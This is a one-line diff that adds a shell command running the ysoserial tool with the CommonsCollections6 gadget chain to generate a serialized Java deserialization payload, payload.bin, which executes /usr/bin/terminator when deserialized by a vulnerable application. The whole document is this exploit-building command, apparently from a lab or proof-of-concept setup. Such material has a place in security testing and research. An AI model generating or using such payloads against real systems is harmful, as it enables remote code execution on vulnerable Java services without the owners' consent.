@@ -1,0 +1,1 @@
+/usr/lib/jvm/java-8-openjdk-amd64/bin/java -jar ./ysoserial-all.jar CommonsCollections6 /usr/bin/terminator > payload.bin
